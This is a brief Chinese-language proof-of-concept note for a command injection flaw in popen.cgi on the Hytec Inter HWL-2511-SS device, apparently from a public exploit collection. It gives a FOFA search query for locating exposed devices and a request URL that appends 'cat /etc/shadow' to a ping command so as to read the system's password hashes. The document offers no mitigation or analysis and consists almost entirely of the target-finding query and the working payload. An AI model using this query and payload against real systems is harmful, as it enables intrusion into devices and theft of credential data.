## Hytec Inter HWL-2511-SS popen.cgi命令注入漏洞

## fofa
```
title="index" && header="lighttpd/1.4.30"
```
![image](https://github.com/user-attachments/assets/45a0ebdc-3478-47ec-ba9c-af51c24c94e4)

### poc
```

/cgi-bin/popen.cgi?command=ping%20-c%204%201.1.1.1;cat%20/etc/shadow&v=0.1303033443137921
```
